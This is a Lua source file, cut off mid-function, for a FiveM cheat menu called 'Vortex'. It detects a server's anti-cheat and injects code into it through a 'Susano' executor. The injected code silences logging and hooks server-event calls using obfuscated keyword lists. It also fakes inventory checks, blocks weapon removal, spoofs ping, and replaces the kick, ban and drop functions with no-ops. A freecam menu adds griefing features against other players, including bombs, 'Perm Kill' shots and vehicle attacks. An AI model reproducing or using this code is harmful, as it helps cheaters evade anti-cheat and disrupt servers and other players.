    sportsclassic = vortex_convertVehicleList({ "ardent", "btype", "btype2", "btype3", "casco", "cheburek", "cheetah2", "cheetah3", "coquette2", "deluxo", "dynasty", "fagaloa", "feltzer3", "gt500", "infernus2", "jb700", "jb7002", "mamba", "manana", "michelli", "monroe", "nebula", "peyote", "peyote3", "pigalle", "rapidgt3", "retinue", "retinue2", "savestra", "stinger", "stingergt", "stromberg", "swinger", "toreador", "torero", "tornado", "tornado2", "tornado3", "tornado4", "tornado5", "tornado6", "turismo2", "viseris", "z190", "zion3", "ztype" }),
    super = vortex_convertVehicleList({ "adder", "autarch", "banshee2", "bullet", "champion", "cheetah", "cyclone", "deveste", "emerus", "entity2", "entity3", "entityxf", "fmj", "furia", "gp1", "ignus", "infernus", "italigtb", "italigtb2", "krieger", "le7b", "lm87", "nero", "nero2", "osiris", "penetrator", "pfister811", "prototipo", "reaper", "s80", "sc1", "scramjet", "sheava", "sultanrs", "suzume", "t20", "taipan", "tempesta", "tezeract", "thrax", "tigon", "torero2", "turismo3", "turismor", "tyrant", "tyrus", "vacca", "vagner", "vigilante", "virtue", "visione", "voltic", "voltic2", "xa21", "zeno", "zentorno", "zorrusso" }),
    suv = vortex_convertVehicleList({ "aleutian", "astron", "baller", "baller2", "baller3", "baller4", "baller5", "baller6", "baller7", "baller8", "bjxl", "cavalcade", "cavalcade2", "cavalcade3", "contender", "dorado", "dubsta", "dubsta2", "everon3", "fq2", "granger", "granger2", "gresley", "habanero", "huntley", "issi8", "iwagen", "jubilee", "landstalker", "landstalker2", "mesa", "mesa2", "novak", "patriot", "patriot2", "radi", "rebla", "rocoto", "seminole", "seminole2", "serrano", "squaddie", "toros", "vivanite", "woodlander", "xls", "xls2" })
}

local function Vortex_InjectIntoResource(resourceName)
    local injectionCode = [[
        local susano = rawget(_G, "Susano")
        if susano and type(susano) == "table" and susano.CreateSpoofedVehicle and type(susano.CreateSpoofedVehicle) == "function" then
            local oldSpawn = susano.CreateSpoofedVehicle
        if oldSpawn then
                susano.CreateSpoofedVehicle = function(model, x, y, z, heading, isNetwork, netMissionEntity, p7)
                local hash = type(model) == "string" and GetHashKey(model) or model
                return oldSpawn(hash, x, y, z, heading, isNetwork, netMissionEntity, p7)
                end
            end
        end
    ]]

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local success = pcall(function()
            Susano.InjectResource(resourceName, injectionCode)
        end)
        if not success then
            print("^1[ERROR] Failed to inject into " .. tostring(resourceName) .. "^7")
        end
    end
end

local function Vortex_DetectAnvilAC()
    local detectionMethods = {}

    for i = 0, GetNumResources() - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local metadata = GetResourceMetadata(resName, "description", 0)
            local author = GetResourceMetadata(resName, "author", 0)

            if author then
                local authLower = string.lower(author)
                if string.find(authLower, "jerome") or string.find(authLower, "jeromebro") then
                    table.insert(detectionMethods, {name = resName, confidence = 100})
                elseif string.find(authLower, "anvil") or string.find(authLower, "anticheat") then
                    table.insert(detectionMethods, {name = resName, confidence = 90})
                end
            end

            if metadata then
                local metaLower = string.lower(metadata)
                if string.find(metaLower, "anticheat") or string.find(metaLower, "anti-cheat") or
                   string.find(metaLower, "protection") or string.find(metaLower, "security") then
                    table.insert(detectionMethods, {name = resName, confidence = 80})
                end
            end

            local resLower = string.lower(resName)
            if string.find(resLower, "anvil") then
                table.insert(detectionMethods, {name = resName, confidence = 95})
            elseif string.find(resLower, "ac") and string.len(resName) < 10 then
                table.insert(detectionMethods, {name = resName, confidence = 70})
            elseif string.find(resLower, "anticheat") or string.find(resLower, "anti") then
                table.insert(detectionMethods, {name = resName, confidence = 85})
            end
        end
    end

    local bestMatch = nil
    local highestConfidence = 0

    for i = 1, #detectionMethods do
        local detection = detectionMethods[i]
        if detection.confidence > highestConfidence then
            highestConfidence = detection.confidence
            bestMatch = detection.name
        end
    end

    if bestMatch and highestConfidence >= 70 then
        return bestMatch
    end

    return nil
end

local function Vortex_ProtectAnvilAC(targetResource)
    if not targetResource or not (type(Susano) == "table" and type(Susano.InjectResource) == "function") then
        return
    end

    Susano.InjectResource(targetResource, [[
        print = function() end
        warn = function() end
        error = function() end

        local oldTrace = Citizen.Trace
        Citizen.Trace = function(message)
            if message then
                local msg = tostring(message)
                if msg:find("weapon") or msg:find("WEAPON") or msg:find("spawned") or
                   msg:find("detection") or msg:find("anticheat") or msg:find("violation") then
                    return
                end
            end
            oldTrace(message)
        end
    ]])

    Wait(100)

    Susano.InjectResource(targetResource, [[
        local _tse = rawget(_G, (function()local k=47;local b={131,161,152,150,150,148,161,130,148,161,165,148,161,116,165,148,157,163};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)())
        if _tse then
            local _orig = _tse
            local _bl = {}
            for _,w in ipairs({
                (function()local k=19;local b={137,120,116,131,130,129};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=33;local b={148,145,130,152,143,134,133};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=11;local b={108,121,129,116,119};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=7;local b={104,117,123,112,106,111,108,104,123};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=5;local b={102,104,63};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=13;local b={111,110,123};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=9;local b={116,114,108,116};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=15;local b={115,116,131,116,114,131};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=21;local b={139,126,132,129,118,137,126,132,131};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                (function()local k=17;local b={125,128,120};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)()
            }) do _bl[w] = true end
            rawset(_G, (function()local k=47;local b={131,161,152,150,150,148,161,130,148,161,165,148,161,116,165,148,157,163};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(), function(eventName, ...)
                if eventName and type(eventName) == "string" then
                    local l = string.lower(eventName)
                    for kw in pairs(_bl) do
                        if l:find(kw, 1, true) then return end
                    end
                end
                return _orig(eventName, ...)
            end)
        end
    ]])

    Wait(100)

    Susano.InjectResource(targetResource, [[
        local protectedWeapons = {}
        local inventoryData = {}

        if exports then
            local oldExports = exports
            exports = setmetatable({}, {
                __index = function(t, k)
                    local res = oldExports[k]
                    if type(res) == "table" then
                        return setmetatable({}, {
                            __index = function(t2, k2)
                                local func = res[k2]
                                if type(func) == "function" then
                                    local lowerK = string.lower(tostring(k))
                                    local lowerK2 = string.lower(tostring(k2))
                                    if string.find(lowerK, "inventory") or string.find(lowerK, "inv") or
                                       string.find(lowerK2, "getinventory") or string.find(lowerK2, "checkitem") or
                                       string.find(lowerK2, "hasitem") or string.find(lowerK2, "getitem") then
                                        return function(...)
                                            return inventoryData
                                        end
                                    end
                                end
                                return func
                            end
                        })
                    end
                    return res
                end
            })
        end

        if GiveWeaponToPed then
            local oldGiveWeapon = GiveWeaponToPed
            GiveWeaponToPed = function(ped, weaponHash, ammoCount, isHidden, equipNow)
                local result = oldGiveWeapon(ped, weaponHash, ammoCount, isHidden, equipNow)
                if ped == PlayerPedId() and result then
                    protectedWeapons[weaponHash] = true
                    inventoryData[weaponHash] = {count = ammoCount or 250, name = "weapon"}
                end
                return result
            end
        end

        if RemoveWeaponFromPed then
            local oldRemoveWeapon = RemoveWeaponFromPed
            RemoveWeaponFromPed = function(ped, weaponHash)
                if ped == PlayerPedId() and protectedWeapons[weaponHash] then
                    return
                end
                return oldRemoveWeapon(ped, weaponHash)
            end
        end

        if RemoveAllPedWeapons then
            local oldRemoveAll = RemoveAllPedWeapons
            RemoveAllPedWeapons = function(ped, p1)
                if ped == PlayerPedId() then
                    return
                end
                return oldRemoveAll(ped, p1)
            end
        end


        if GetAmmoInPedWeapon then
            local oldGetAmmo = GetAmmoInPedWeapon
            GetAmmoInPedWeapon = function(ped, weaponHash)
                if ped == PlayerPedId() and protectedWeapons[weaponHash] then
                    return 250
                end
                return oldGetAmmo(ped, weaponHash)
            end
        end

    ]])

    Wait(100)

    Susano.InjectResource(targetResource, [[
        if RegisterNetEvent then
            local oldRegister = RegisterNetEvent
            RegisterNetEvent = function(eventName, callback)
                if eventName and type(eventName) == "string" then
                    local lower = string.lower(eventName)
                    if string.find(lower, "weapon") or string.find(lower, "anvil") or
                       string.find(lower, "anticheat") or string.find(lower, "ac:") or
                       string.find(lower, "ban") or string.find(lower, "kick") then
                        return
                    end
                end
                return oldRegister(eventName, callback)
            end
        end
    ]])

    Wait(100)

    Susano.InjectResource(targetResource, [[
        if GetPlayerPing then
            local oldPing = GetPlayerPing
            GetPlayerPing = function(player)
                if player == PlayerId() then
                    return math.random(30, 70)
                end
                return oldPing(player)
            end
        end

        if NetworkIsPlayerActive then
            NetworkIsPlayerActive = function(player)
                if player == PlayerId() then
                    return true
                end
                return NetworkIsPlayerActive(player)
            end
        end
    ]])

    Wait(100)

    Susano.InjectResource(targetResource, [[
        if DropPlayer then
            DropPlayer = function() end
        end

        if BanPlayer then
            BanPlayer = function() end
        end

        if KickPlayer then
            KickPlayer = function() end
        end
    ]])
end

function Vortex_SpawnVehicle(vehicleName, teleportInto, deletePrevious)
    if not vehicleName or vehicleName == "" then
        return
    end

    teleportInto = teleportInto ~= false
    deletePrevious = deletePrevious == true

    local model = vehicleName

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local success = pcall(function()
            Susano.InjectResource("any", string.format([[
                CreateThread(function()
                    local model = "%s"
                    local ped = PlayerPedId()
                    if not ped or ped == 0 then return end

                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local offsetX = coords.x + math.sin(math.rad(heading)) * 3.0
                    local offsetY = coords.y + math.cos(math.rad(heading)) * 3.0
                    local offsetZ = coords.z

                    if %s then
                        local currentVeh = GetVehiclePedIsIn(ped, false)
                        if currentVeh and currentVeh ~= 0 and DoesEntityExist(currentVeh) then
                            pcall(function() DeleteEntity(currentVeh) end)
                        end
                    end

                    local modelHash = GetHashKey(model)
                    if modelHash == 0 then
                        return
                    end

                    RequestModel(modelHash)
                    local timeout = 0
                    while not HasModelLoaded(modelHash) and timeout < 200 do
                        Wait(10)
                        timeout = timeout + 1
                    end

                    if HasModelLoaded(modelHash) then
                        Wait(200)
                        local vehicle = pcall(function() return CreateVehicle(modelHash, offsetX, offsetY, offsetZ, heading, true, false) end)
                        if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                            pcall(function()
                                SetEntityAsMissionEntity(vehicle, true, true)
                                SetVehicleHasBeenOwnedByPlayer(vehicle, true)
                                SetVehicleNeedsToBeHotwired(vehicle, false)
                                SetVehicleEngineOn(vehicle, true, true, false)
                                SetVehicleOnGroundProperly(vehicle)
                            end)

                            if %s then
                                Wait(300)
                                pcall(function() TaskWarpPedIntoVehicle(ped, vehicle, -1) end)
                            end

                            pcall(function() SetModelAsNoLongerNeeded(modelHash) end)
                        end
                    end
                end)
            ]], model, tostring(deletePrevious), tostring(teleportInto)))
        end)
        if not success then
            print("^1[Vortex] Erreur: Impossible d'injecter le spawn du vÃ©hicule^7")
        end
    else
        Citizen.CreateThread(function()
            if deletePrevious then
                local ped = PlayerPedId()
                local currentVeh = GetVehiclePedIsIn(ped, false)
                if currentVeh and currentVeh ~= 0 and DoesEntityExist(currentVeh) then
                    DeleteEntity(currentVeh)
                end
            end

            local modelHash = GetHashKey(model)
            if modelHash == 0 then
                return
            end

            RequestModel(modelHash)
            local timeout = 0
            while not HasModelLoaded(modelHash) and timeout < 200 do
                Citizen.Wait(10)
                timeout = timeout + 1
            end

            if HasModelLoaded(modelHash) then
                Citizen.Wait(200)
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offsetX = coords.x + math.sin(math.rad(heading)) * 3.0
                local offsetY = coords.y + math.cos(math.rad(heading)) * 3.0
                local vehicle = CreateVehicle(modelHash, offsetX, offsetY, coords.z, heading, false, false)
                if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                    SetEntityAsMissionEntity(vehicle, true, true)
                    SetVehicleHasBeenOwnedByPlayer(vehicle, true)
                    SetVehicleNeedsToBeHotwired(vehicle, false)
                    SetVehicleEngineOn(vehicle, true, true, false)
                    SetVehicleOnGroundProperly(vehicle)

                    if teleportInto then
                        Citizen.Wait(300)
                        TaskWarpPedIntoVehicle(ped, vehicle, -1)
                    end

                    SetModelAsNoLongerNeeded(modelHash)
                end
            end
        end)
    end
end






--[[
    VORTEX FREECAM v5 - CAMERA SCRIPTEE DETACHEE
    
    Utilise CreateCam("DEFAULT_SCRIPTED_CAMERA") pour une camera
    100% independante du personnage.
    
    La souris controle la rotation de la camera (pitch/heading).
    ZQSD deplace la camera dans la direction ou elle regarde.
    Le crosshair "+" est exactement la ou la camera pointe.
    
    Susano.GetAsyncKeyState() pour les touches clavier.
    GetDisabledControlNormal() pour la souris (controles FiveM).
]]

------------------------------------------------------------
-- EnableFreecam : toggle ON/OFF
------------------------------------------------------------
------------------------------------------------------------
-- EnableFreecam : toggle ON/OFF
------------------------------------------------------------
function EnableFreecam()
    -- Init state une seule fois
    if not _G.vortexFreecam then
        _G.vortexFreecam = {
            isToggled = false,
            cam = nil,
            pos = vector3(0, 0, 0),
            pitch = 0.0,
            heading = 0.0,
            cameraSpeed = 2.0,
            currentSpeed = 0.0,
            lastMoveDir = vector3(0, 0, 0),
            mouseSensitivity = 4.0,

            features = { "TP Camera", "Teleport", "Shoot", "Shoot Car", "Spawn Bomb", "Blackhole", "Kick Vehicle", "Delete Vehicle", "Fuck Vehicle", "RC Control Car" },
            shootFeatures = { ["Shoot"] = true, ["Shoot Car"] = true, ["Spawn Bomb"] = true },
            currentFeature = 1,
            savedFeature = 1,
            currentModelIndex = 1,
            currentVehicleIndex = 1,
            currentExplosionIndex = 1,
            pistolModels = {
                { label = "Perm Kill", model = "weapon_tranquilizer" },
                { label = "Pistol", model = "weapon_pistol" },
                { label = "Heavy Pistol", model = "weapon_heavypistol" },
                { label = "Combat Pistol", model = "weapon_combatpistol" },
                { label = "AP Pistol", model = "weapon_appistol" },
                { label = "Stun Gun", model = "weapon_stungun" },
                { label = "Firework", model = "weapon_firework" }
            },
            vehicleModels = {
                { label = "Nimbus", model = "nimbus" },
                { label = "Luxor", model = "luxor" },
                { label = "Luxor2", model = "luxor2" },
                { label = "Elegy", model = "elegy" },
                { label = "Pounder", model = "pounder" },
                { label = "Adder", model = "adder" },
                { label = "Zentorno", model = "zentorno" },
                { label = "T20", model = "t20" },
                { label = "Osiris", model = "osiris" },
                { label = "X80 Proto", model = "x80proto" },
                { label = "Tyrus", model = "tyrus" },
                { label = "Vagner", model = "vagner" },
                { label = "Entity XF", model = "entityxf" },
                { label = "Infernus", model = "infernus" },
                { label = "Riot2", model = "riot2" },
                { label = "Kosatka", model = "kosatka" }
            },
            explosionTypes = {
                { label = "Default", type = "default" },
                { label = "Car", type = "car" },
                { label = "Plane", type = "plane" },
                { label = "Boat", type = "boat" },
                { label = "Heli", type = "heli" }
            },
            smoothScrollOffset = 0.0,
            blackholePressed = false,
            blackholeFrameCount = 0,
            blackholeControlledVehicles = {},
            prevKeys = {},
            threadsStarted = false,
            shutdown = false,
            tpBusy = false,
            needsCamInit = false
        }
    end

    local fc = _G.vortexFreecam
    fc.cameraSpeed = freecamSpeed or 2.0
    fc.isToggled = vortex_freecamEnabled

    if fc.isToggled then
        -----------------------------------------------
        -- ACTIVATION
        -----------------------------------------------
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)

        local grX, grY, grZ = GetGameplayCamRot(2)
        if type(grX) == "vector3" then
            fc.pitch = grX.x
            fc.heading = grX.z
        else
            fc.pitch = grX or 0.0
            fc.heading = grZ or 0.0
        end

        fc.pos = vector3(coords.x, coords.y, coords.z + 1.0)
        fc.currentSpeed = 0.0
        fc.lastMoveDir = vector3(0, 0, 0)
        fc.currentFeature = fc.savedFeature or 1
        fc.tpBusy = false
        fc.needsCamInit = true -- Demander creation au thread

        -- Debloquer la camera si elle etait verrouillee d'une session precedente
        if type(Susano) == "table" and type(Susano.LockCameraPos) == "function" then
            pcall(Susano.LockCameraPos, false)
        end

        -- Nettoyage preventif
        if fc.cam and DoesCamExist(fc.cam) then
            DestroyCam(fc.cam, false)
            fc.cam = nil
        end

        -- Masquer ped
        FreezeEntityPosition(ped, true)
        SetEntityVisible(ped, false, false)
        SetEntityInvincible(ped, true)
        SetEntityCollision(ped, false, false)
        SetEntityAlpha(ped, 0, false)

        if not fc.threadsStarted then
            fc.threadsStarted = true

            -- Thread unique pour tout gerer (plus stable)
            Citizen.CreateThread(function()
                while _G.vortexFreecam and not _G.vortexFreecam.shutdown do
                    if _G.vortexFreecam.isToggled then
                        vortex_fcTick()
                        vortex_fcDrawUI()
                    end
                    Citizen.Wait(0)
                end
            end)
        end
        print("^2[FREECAM] ON (Wait for cam creation logic...)^0")

    else
        -----------------------------------------------
        -- DESACTIVATION
        -----------------------------------------------
        fc.savedFeature = fc.currentFeature
        fc.currentSpeed = 0.0
        fc.needsCamInit = false

        if fc.cam and DoesCamExist(fc.cam) then
            RenderScriptCams(false, false, 0, true, true)
            SetCamActive(fc.cam, false)
            DestroyCam(fc.cam, false)
            fc.cam = nil
        end

        local ped = PlayerPedId()
        ResetEntityAlpha(ped)
        SetEntityVisible(ped, true, false)
        SetEntityCollision(ped, true, true)
        SetEntityInvincible(ped, false)
        FreezeEntityPosition(ped, false)
        SetEntityCoords(ped, fc.pos.x, fc.pos.y, fc.pos.z - 1.0, false, false, false, false)
        SetFocusEntity(ped)
        ClearFocus()

        -- Debloquer la camera si on l'avait verrouillee
        if type(Susano) == "table" and type(Susano.LockCameraPos) == "function" then
            pcall(Susano.LockCameraPos, false)
        end

        if _G.rcCarControlActive then
            if _G.rcCameraControl then
                RenderScriptCams(false, true, 500, true, true)
                DestroyCam(_G.rcCameraControl, false)
                _G.rcCameraControl = nil
            end
            _G.rcCarControlActive = false
            _G.rcCarControl = nil
        end

        print("^1[FREECAM] OFF^0")
    end
end

------------------------------------------------------------
-- Helpers input
------------------------------------------------------------

local vortex_fcControlMap = {
    [0x5A] = 32, -- Z -> Move Forward (AZERTY)
    [0x57] = 32, -- W -> Move Forward (QWERTY)
    [0x53] = 33, -- S -> Move Back
    [0x51] = 34, -- Q -> Move Left
    [0x41] = 34, -- A -> Move Left (QWERTY)
    [0x44] = 35, -- D -> Move Right
    [0x20] = 22, -- Space -> Jump (ascend)
    [0x11] = 36, -- Ctrl -> Duck (descend)
    [0x10] = 21, -- Shift -> Sprint (speed boost)
    [0x01] = 24, -- LMB
}

local vortex_fcKeyAliases = {
    forward = {0x5A, 0x57},
    backward = {0x53},
    left = {0x51, 0x41},
    right = {0x44},
    ascend = {0x20},
    descend = {0x11},
    boost = {0x10}
}

local function vortex_fcControlDown(control)
    return IsDisabledControlPressed(0, control) or IsControlPressed(0, control)
end

-- Touche maintenue (Susano)
function vortex_fcKeyDown(vk)
    if type(Susano) == "table" and type(Susano.GetAsyncKeyState) == "function" then
        local ok, result = pcall(Susano.GetAsyncKeyState, vk)
        if ok then
            -- GetAsyncKeyState peut retourner un bool ou un nombre
            -- En Lua, 0 est truthy, donc on doit verifier explicitement
            if type(result) == "boolean" then
                if result then return true end
            elseif type(result) == "number" then
                if result ~= 0 then return true end
            end
        end
    end

    local mappedControl = vortex_fcControlMap[vk]
    if mappedControl then
        return vortex_fcControlDown(mappedControl)
    end
    return false
end

-- Touche juste pressee (front montant)
function vortex_fcKeyJustPressed(vk)
    local fc = _G.vortexFreecam
    if not fc then return false end
    local down = vortex_fcKeyDown(vk)
    local wasDown = fc.prevKeys[vk] or false
    fc.prevKeys[vk] = down
    return down and not wasDown
end

local function vortex_fcAliasDown(alias)
    local keys = vortex_fcKeyAliases[alias]
    if not keys then return false end
    for i = 1, #keys do
        if vortex_fcKeyDown(keys[i]) then
            return true
        end
    end
    return false
end

------------------------------------------------------------
-- UI : crosshair + liste features
------------------------------------------------------------
function vortex_fcDrawUI()
    local fc = _G.vortexFreecam
    if not fc or not fc.isToggled then return end

    -- Crosshair "+"
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.3, 0.3)
    SetTextColour(255, 255, 255, 255)
    SetTextCentre(true)
    SetTextOutline()
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName("+")
    EndTextCommandDisplayText(0.5, 0.49)

    -- Liste des features
    local baseY = 0.80
    local lineH = 0.025
    local scale = 0.25
    local maxVisible = 7
    local cur = fc.currentFeature

    fc.smoothScrollOffset = fc.smoothScrollOffset + (0.0 - fc.smoothScrollOffset) * 0.20

    local startIdx = math.max(1, cur - math.floor(maxVisible / 2))
    local endIdx = math.min(#fc.features, startIdx + maxVisible - 1)
    if endIdx - startIdx < maxVisible - 1 then
        startIdx = math.max(1, endIdx - maxVisible + 1)
    end

    for i = startIdx, endIdx do
        local feat = fc.features[i]
        local dist = math.abs(i - cur)
        local yOff = (i - cur) * lineH + fc.smoothScrollOffset
        local yPos = baseY + yOff
        local alpha = dist > 2 and math.max(150, 255 - (dist - 2) * 30) or 255

        SetTextFont(0)
        SetTextProportional(1)
        SetTextScale(scale, scale)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(1, 0, 0, 0, 255)
        SetTextOutline()
        SetTextCentre(true)

        local text = feat
        if i == cur then
            SetTextColour(255, 0, 0, alpha)
            if fc.shootFeatures[feat] then
                local model
                if feat == "Shoot" then
                    model = fc.pistolModels[fc.currentModelIndex]
                elseif feat == "Shoot Car" then
                    model = fc.vehicleModels[fc.currentVehicleIndex]
                elseif feat == "Spawn Bomb" then
                    model = fc.explosionTypes[fc.currentExplosionIndex]
                end
                if model then
                    text = string.format("%s %s (%s) %s", "\226\134\144", feat, model.label, "\226\134\146")
                end
            end
        else
            local g = math.max(150, 255 - dist * 30)
            SetTextColour(g, g, g, alpha)
        end

        BeginTextCommandDisplayText("STRING")
        AddTextComponentSubstringPlayerName(text)
        EndTextCommandDisplayText(0.5, yPos)
    end

    -- HUD RC Car
    if _G.rcCarControlActive and _G.rcCarControl and DoesEntityExist(_G.rcCarControl) then
        SetTextFont(0)
        SetTextProportional(1)
        SetTextScale(0.4, 0.4)
        SetTextColour(255, 255, 255, 255)
        SetTextCentre(true)
        SetTextOutline()
        BeginTextCommandDisplayText("STRING")
        AddTextComponentSubstringPlayerName("RC Control Active - Press X to Exit")
        EndTextCommandDisplayText(0.5, 0.95)
    end
end

------------------------------------------------------------
-- Tick principal : mouvement souris + ZQSD + features
------------------------------------------------------------
function vortex_fcTick()
    local fc = _G.vortexFreecam
    if not fc or not fc.isToggled then return end

    -- Lazy init cam if needed
    if fc.needsCamInit or not fc.cam or not DoesCamExist(fc.cam) then
        if fc.cam and DoesCamExist(fc.cam) then DestroyCam(fc.cam, false) end
        fc.cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
        if not fc.cam or fc.cam == 0 then return end
        SetCamCoord(fc.cam, fc.pos.x, fc.pos.y, fc.pos.z)
        SetCamRot(fc.cam, fc.pitch, 0.0, fc.heading, 2)
        SetCamFov(fc.cam, GetGameplayCamFov())
        SetCamActive(fc.cam, true)
        RenderScriptCams(true, false, 0, true, true)
        fc.needsCamInit = false
    end

    local dt = GetFrameTime()
    if dt <= 0 or dt > 0.1 then dt = 0.016 end

    -- Disable standard inputs
    DisableAllControlActions(0)
    EnableControlAction(0, 241, true)
    EnableControlAction(0, 242, true)
    EnableControlAction(0, 245, true)
    EnableControlAction(0, 200, true)
    EnableControlAction(0, 322, true)

    -- Mouse rotation (always available via GetDisabledControlNormal)
    local mouseX = GetDisabledControlNormal(0, 1)
    local mouseY = GetDisabledControlNormal(0, 2)
    local sens = fc.mouseSensitivity

    fc.heading = fc.heading - mouseX * sens
    fc.pitch = fc.pitch - mouseY * sens

    if fc.pitch > 89.0 then fc.pitch = 89.0 end
    if fc.pitch < -89.0 then fc.pitch = -89.0 end
    if fc.heading > 180.0 then fc.heading = fc.heading - 360.0 end
    if fc.heading < -180.0 then fc.heading = fc.heading + 360.0 end

    -- Direction vectors
    local pitchRad = math.rad(fc.pitch)
    local headRad = math.rad(fc.heading)
    local cp = math.cos(pitchRad)
    local sp = math.sin(pitchRad)
    local ch = math.cos(headRad)
    local sh = math.sin(headRad)

    local fwdX = -sh * cp
    local fwdY =  ch * cp
    local fwdZ =  sp
    local rightX =  ch
    local rightY =  sh

    -- ZQSD Movement
    local ix, iy, iz = 0.0, 0.0, 0.0
    if vortex_fcAliasDown("forward") then ix = ix + fwdX; iy = iy + fwdY; iz = iz + fwdZ end
    if vortex_fcAliasDown("backward") then ix = ix - fwdX; iy = iy - fwdY; iz = iz - fwdZ end
    if vortex_fcAliasDown("right") then ix = ix + rightX; iy = iy + rightY end
    if vortex_fcAliasDown("left") then ix = ix - rightX; iy = iy - rightY end
    if vortex_fcAliasDown("ascend") then iz = iz + 1.0 end
    if vortex_fcAliasDown("descend") then iz = iz - 1.0 end

    -- Acceleration
    local inputLen = math.sqrt(ix * ix + iy * iy + iz * iz)
    local hasInput = inputLen > 0.001
    local maxSpeed = fc.cameraSpeed * 30.0
    if vortex_fcAliasDown("boost") then maxSpeed = maxSpeed * 3.0 end

    if hasInput then
        fc.lastMoveDir = vector3(ix / inputLen, iy / inputLen, iz / inputLen)
        local accelRate = maxSpeed * 4.0
        fc.currentSpeed = math.min(fc.currentSpeed + accelRate * dt, maxSpeed)
    else
        fc.currentSpeed = fc.currentSpeed * math.max(0, 1.0 - 8.0 * dt)
        if fc.currentSpeed < 0.05 then fc.currentSpeed = 0.0 end
    end

    if fc.currentSpeed > 0.01 then
        local delta = fc.currentSpeed * dt
        local d = fc.lastMoveDir
        fc.pos = vector3(fc.pos.x + d.x * delta, fc.pos.y + d.y * delta, fc.pos.z + d.z * delta)
    end

    -- Update camera
    SetCamCoord(fc.cam, fc.pos.x, fc.pos.y, fc.pos.z)
    SetCamRot(fc.cam, fc.pitch, 0.0, fc.heading, 2)
    SetCamActive(fc.cam, true)
    RenderScriptCams(true, false, 0, true, true)
    SetFocusPosAndVel(fc.pos.x, fc.pos.y, fc.pos.z, 0.0, 0.0, 0.0)

    -- Lock ped
    local ped = PlayerPedId()
    if not IsEntityVisible(ped) then -- Only if we hid it
        FreezeEntityPosition(ped, true)
        SetEntityVisible(ped, false, false)
        SetEntityInvincible(ped, true)
    end

    -- Features scrolling
    local scrollUp = IsDisabledControlJustPressed(0, 241) or IsDisabledControlJustPressed(0, 172) or vortex_fcKeyJustPressed(0x26)
    local scrollDown = IsDisabledControlJustPressed(0, 242) or IsDisabledControlJustPressed(0, 173) or vortex_fcKeyJustPressed(0x28)

    if scrollUp then
        local prev = fc.currentFeature
        fc.currentFeature = fc.currentFeature - 1
        if fc.currentFeature < 1 then fc.currentFeature = #fc.features end
        fc.savedFeature = fc.currentFeature
        fc.smoothScrollOffset = fc.smoothScrollOffset + (prev - fc.currentFeature) * 0.025
    end
    if scrollDown then
        local prev = fc.currentFeature
        fc.currentFeature = fc.currentFeature + 1
        if fc.currentFeature > #fc.features then fc.currentFeature = 1 end
        fc.savedFeature = fc.currentFeature
        fc.smoothScrollOffset = fc.smoothScrollOffset + (prev - fc.currentFeature) * 0.025
    end

    -- Features selection
    local feat = fc.features[fc.currentFeature]
    local leftP = vortex_fcKeyJustPressed(0x25)
    local rightP = vortex_fcKeyJustPressed(0x27)

    if feat == "Shoot" then
        if leftP then fc.currentModelIndex = fc.currentModelIndex - 1; if fc.currentModelIndex < 1 then fc.currentModelIndex = #fc.pistolModels end end
        if rightP then fc.currentModelIndex = fc.currentModelIndex + 1; if fc.currentModelIndex > #fc.pistolModels then fc.currentModelIndex = 1 end end
    elseif feat == "Shoot Car" then
        if leftP then fc.currentVehicleIndex = fc.currentVehicleIndex - 1; if fc.currentVehicleIndex < 1 then fc.currentVehicleIndex = #fc.vehicleModels end end
        if rightP then fc.currentVehicleIndex = fc.currentVehicleIndex + 1; if fc.currentVehicleIndex > #fc.vehicleModels then fc.currentVehicleIndex = 1 end end
    elseif feat == "Spawn Bomb" then
        if leftP then fc.currentExplosionIndex = fc.currentExplosionIndex - 1; if fc.currentExplosionIndex < 1 then fc.currentExplosionIndex = #fc.explosionTypes end end
        if rightP then fc.currentExplosionIndex = fc.currentExplosionIndex + 1; if fc.currentExplosionIndex > #fc.explosionTypes then fc.currentExplosionIndex = 1 end end
    end

    -- RC Car override
    if _G.rcCarControlActive and _G.rcCarControl and DoesEntityExist(_G.rcCarControl) then
        vortex_fcHandleRCCar()
        return
    end

    -- Raycast
    local rEx = fc.pos.x + fwdX * 500.0
    local rEy = fc.pos.y + fwdY * 500.0
    local rEz = fc.pos.z + fwdZ * 500.0
    
    -- Using the expensive probe only if not busy to save perf? No, needed for aim.
    -- Include own ped to ignore it
    local rayHandle = StartExpensiveSynchronousShapeTestLosProbe(
        fc.pos.x, fc.pos.y, fc.pos.z,
        rEx, rEy, rEz, -1, ped, 7
    )
    local retval, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)
    if retval ~= 2 then hit = false end

    -- Trigger Feature
    local lmbPressed = vortex_fcKeyJustPressed(0x01)
    local lmbDown = vortex_fcKeyDown(0x01)

    if feat == "TP Camera" then
        if lmbPressed and hit then
